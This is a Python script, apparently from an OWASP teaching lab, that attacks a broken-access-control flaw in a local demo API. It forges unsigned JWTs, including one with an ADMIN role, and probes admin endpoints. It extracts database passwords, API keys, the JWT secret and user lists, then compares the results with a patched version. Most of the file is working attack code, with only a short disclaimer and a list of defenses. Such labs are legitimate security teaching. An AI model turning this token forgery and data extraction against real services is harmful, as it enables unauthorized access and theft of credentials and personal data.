#!/usr/bin/env python3
"""
權限提升攻擊腳本
================
此腳本展示如何利用 Function Level Access Control 漏洞進行權限提升。

攻擊原理：
---------
漏洞版本的管理員 API 沒有正確檢查使用者權限，
只要有有效的 Token（即使是一般使用者），就能存取管理功能。

攻擊類型：
1. 垂直權限提升：普通使用者 → 管理員
2. 水平權限提升：使用者 A → 使用者 B 的資料

作者：OWASP Demo
"""

import requests
import json
import argparse
import base64
from datetime import datetime, timedelta

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 管理員端點
ADMIN_ENDPOINTS = [
    ("/api/admin/users", "GET", "使用者列表"),
    ("/api/admin/stats", "GET", "系統統計"),
    ("/api/admin/config", "GET", "系統設定（含敏感資訊）"),
    ("/api/admin/logs", "GET", "系統日誌"),
    ("/api/admin/users/1", "DELETE", "刪除使用者"),
]


def base64url_encode(data: bytes) -> str:
    """Base64 URL 編碼"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def create_token(user_id: int, username: str, role: str = "USER") -> str:
    """建立偽造的 JWT Token"""
    header = {"alg": "HS256", "typ": "JWT"}
    now = datetime.utcnow()
    payload = {
        "sub": username,
        "userId": user_id,
        "username": username,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    fake_signature = base64url_encode(b"FAKE")
    
    return f"{header_encoded}.{payload_encoded}.{fake_signature}"


def login(username: str, password: str, url: str = VULNERABLE_URL) -> str:
    """登入取得 Token"""
    response = requests.post(
        f"{url}/api/auth/login",
        json={"username": username, "password": password}
    )
    
    if response.status_code == 200:
        return response.json().get("token")
    return None


def test_admin_access(token: str, url: str = VULNERABLE_URL):
    """
    測試管理員端點存取權限
    """
    results = []
    
    for endpoint, method, description in ADMIN_ENDPOINTS:
        if method == "GET":
            response = requests.get(
                f"{url}{endpoint}",
                headers={"Authorization": f"Bearer {token}"}
            )
        elif method == "DELETE":
            # 跳過實際刪除操作
            response = requests.options(
                f"{url}{endpoint}",
                headers={"Authorization": f"Bearer {token}"}
            )
        
        result = {
            "endpoint": endpoint,
            "method": method,
            "description": description,
            "status": response.status_code,
            "accessible": response.status_code == 200
        }
        
        if response.status_code == 200:
            try:
                result["data"] = response.json()
            except:
                pass
        
        results.append(result)
    
    return results


def attack_vertical_escalation():
    """
    🔴 攻擊：垂直權限提升
    以一般使用者身份存取管理員功能
    """
    print("\n" + "=" * 60)
    print("🔴 垂直權限提升攻擊")
    print("=" * 60)
    print("📋 情境：一般使用者 'user' 嘗試存取管理員功能")
    
    # 使用偽造的一般使用者 Token
    user_token = create_token(2, "user", "USER")
    
    print("\n🎯 漏洞版本（http://localhost:8081）：")
    print("-" * 50)
    
    results = test_admin_access(user_token, VULNERABLE_URL)
    
    accessible_count = 0
    for r in results:
        if r["accessible"]:
            accessible_count += 1
            print(f"✅ {r['method']} {r['endpoint']}: 可存取！")
            if "data" in r:
                data = r["data"]
                # 顯示部分敏感資訊
                if "users" in data:
                    print(f"   📋 使用者數量：{len(data['users'])}")
                    for user in data['users'][:2]:
                        print(f"      - {user.get('username')}: {user.get('email')}")
                if "database" in str(data):
                    print(f"   ⚠️ 洩露資料庫設定！")
                if "api_keys" in str(data):
                    print(f"   ⚠️ 洩露 API 金鑰！")
        else:
            print(f"❌ {r['method']} {r['endpoint']}: 被拒絕（{r['status']}）")
    
    print(f"\n📊 可存取 {accessible_count}/{len(results)} 個管理端點")
    
    if accessible_count > 0:
        print("⚠️ 嚴重漏洞！一般使用者可以存取管理功能！")


def attack_forged_admin():
    """
    🔴 攻擊：偽造 ADMIN 權限
    修改 Token 中的 role 為 ADMIN
    """
    print("\n" + "=" * 60)
    print("🔴 偽造 ADMIN Token 攻擊")
    print("=" * 60)
    print("📋 情境：偽造 role=ADMIN 的 Token")
    
    # 建立偽造的 ADMIN Token
    admin_token = create_token(999, "hacker", "ADMIN")
    
    print("\n🔓 偽造的 Token 資訊：")
    print(f"   userId: 999（不存在的使用者）")
    print(f"   username: hacker")
    print(f"   role: ADMIN")
    
    print("\n🎯 漏洞版本測試：")
    
    # 存取使用者資訊
    response = requests.get(
        f"{VULNERABLE_URL}/api/auth/me",
        headers={"Authorization": f"Bearer {admin_token}"}
    )
    
    if response.status_code == 200:
        print(f"✅ 成功以偽造身份存取系統！")
        print(f"   回應：{json.dumps(response.json(), indent=2, ensure_ascii=False)}")
    
    # 存取管理功能
    results = test_admin_access(admin_token, VULNERABLE_URL)
    accessible = [r for r in results if r["accessible"]]
    print(f"\n📊 成功存取 {len(accessible)}/{len(results)} 個管理端點")


def attack_sensitive_data_extraction():
    """
    🔴 攻擊：敏感資料萃取
    從管理 API 提取敏感資訊
    """
    print("\n" + "=" * 60)
    print("🔴 敏感資料萃取")
    print("=" * 60)
    
    token = create_token(2, "user", "USER")
    
    # 取得系統設定
    print("\n📋 嘗試取得系統設定...")
    response = requests.get(
        f"{VULNERABLE_URL}/api/admin/config",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        config = response.json()
        print("✅ 成功取得系統設定！")
        print("\n⚠️ 洩露的敏感資訊：")
        
        if "database" in config:
            print(f"\n📌 資料庫設定：")
            db = config["database"]
            print(f"   Host: {db.get('host')}")
            print(f"   Password: {db.get('password')}")
        
        if "api_keys" in config:
            print(f"\n📌 API 金鑰：")
            for name, key in config["api_keys"].items():
                print(f"   {name}: {key[:20]}...")
        
        if "jwt_secret" in config:
            print(f"\n📌 JWT 密鑰：{config['jwt_secret'][:30]}...")
            print("   ⚠️ 有了這個密鑰，攻擊者可以偽造任何 Token！")
    else:
        print(f"❌ 無法取得：{response.status_code}")
    
    # 取得使用者列表
    print("\n📋 嘗試取得使用者列表...")
    response = requests.get(
        f"{VULNERABLE_URL}/api/admin/users",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        users = response.json()
        print("✅ 成功取得使用者列表！")
        print(f"\n📌 使用者資訊（{len(users)} 筆）：")
        for user in users[:5]:
            print(f"   - ID:{user.get('id')} | {user.get('username')} | {user.get('email')} | {user.get('role')}")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 權限提升：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    # 使用一般使用者 Token
    user_token = create_token(2, "user", "USER")
    
    print("\n📋 以一般使用者身份存取 /api/admin/users")
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    response = requests.get(
        f"{VULNERABLE_URL}/api/admin/users",
        headers={"Authorization": f"Bearer {user_token}"}
    )
    if response.status_code == 200:
        users = response.json()
        print(f"   ✅ 存取成功！取得 {len(users)} 筆使用者資料")
    else:
        print(f"   ❌ 存取被拒絕：{response.status_code}")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    try:
        # 安全版本會驗證 JWT，所以偽造的 Token 會失敗
        # 需要先真實登入
        real_token = login("user", "user123", SECURE_URL)
        if real_token:
            response = requests.get(
                f"{SECURE_URL}/api/admin/users",
                headers={"Authorization": f"Bearer {real_token}"}
            )
            if response.status_code == 200:
                print(f"   ⚠️ 意外成功")
            elif response.status_code == 403:
                print(f"   ✅ 存取被拒絕：403 Forbidden")
            else:
                print(f"   ✅ 存取被拒絕：{response.status_code}")
        else:
            # 偽造 Token 測試
            response = requests.get(
                f"{SECURE_URL}/api/admin/users",
                headers={"Authorization": f"Bearer {user_token}"}
            )
            print(f"   ✅ 偽造 Token 被拒絕：{response.status_code}")
    except Exception as e:
        print(f"   ✅ 存取被拒絕")
    
    print("\n📋 安全版本的防禦措施：")
    print("   1. JWT 簽名驗證（無法偽造 Token）")
    print("   2. @PreAuthorize(\"hasRole('ADMIN')\")")
    print("   3. 方法級別的權限檢查")
    print("   4. 角色層級驗證")


def main():
    parser = argparse.ArgumentParser(
        description="權限提升攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python privilege_escalation.py --vertical      # 垂直權限提升
  python privilege_escalation.py --forged        # 偽造 ADMIN Token
  python privilege_escalation.py --extract       # 敏感資料萃取
  python privilege_escalation.py --compare       # 比較漏洞/安全版本
  python privilege_escalation.py --all           # 執行完整演示
        """
    )
    
    parser.add_argument("--vertical", action="store_true", help="垂直權限提升攻擊")
    parser.add_argument("--forged", action="store_true", help="偽造 ADMIN Token")
    parser.add_argument("--extract", action="store_true", help="敏感資料萃取")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("👑 權限提升攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    print(f"📍 目標：{VULNERABLE_URL}")
    
    if args.all:
        attack_vertical_escalation()
        attack_forged_admin()
        attack_sensitive_data_extraction()
        compare_vulnerability()
    elif args.vertical:
        attack_vertical_escalation()
    elif args.forged:
        attack_forged_admin()
    elif args.extract:
        attack_sensitive_data_extraction()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python privilege_escalation.py --all")


if __name__ == "__main__":
    main()
